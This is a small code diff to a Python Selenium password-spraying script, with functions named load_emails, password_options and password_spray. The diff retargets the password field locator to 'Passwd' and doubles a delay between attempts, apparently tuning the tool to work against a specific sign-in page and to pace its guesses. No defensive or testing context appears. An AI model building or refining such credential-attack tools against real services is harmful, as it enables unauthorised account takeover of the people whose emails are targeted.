@@ -30,7 +30,7 @@ def load_emails(email_file):
 
 def password_options(email, password):
 	global driver
-	inputElement = driver.find_element(By.NAME,"password")
+	inputElement = driver.find_element(By.NAME,"Passwd")
 	inputElement.send_keys(password)
 
 	time.sleep(2)
@@ -87,7 +87,7 @@ def password_spray(email,password):
 		inputElement.send_keys(Keys.ENTER)
 		inputElement.submit()
 
-		time.sleep(5)
+		time.sleep(10)
 		password_options(emails,password)
 
 if __name__ == '__main__':
